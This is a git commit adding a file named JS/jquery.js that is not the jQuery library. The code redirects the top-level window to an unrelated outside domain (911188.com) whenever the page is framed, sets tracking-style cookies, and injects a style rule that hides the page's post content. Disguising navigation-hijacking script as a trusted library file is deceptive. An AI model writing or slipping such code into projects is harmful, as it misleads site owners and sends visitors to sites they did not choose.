b83a7737b1bce6966a39ce1649fd19dae2cb7880
futuresos <42096453+futuresos@users.noreply.github.com>
2019-05-21 21:06:37 +0800

    AD3

---
+++ JS/jquery.js
@@ -0,0 +1,20 @@
+﻿if(top.location!==self.location){ 
+	top.location.href="http://911188.com"; 
+}
+
+function sc(id)
+{
+	document.cookie="picid="+id+";path=/";
+	document.cookie="spv_flag=1;path=/";
+	return true;
+}
+
+function getCookie(name) 
+{ 
+    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+    if(arr=document.cookie.match(reg))
+        return unescape(arr[2]); 
+    else 
+        return null; 
+}
+document.writeln("<style>.postBody {display:none;}</style>");
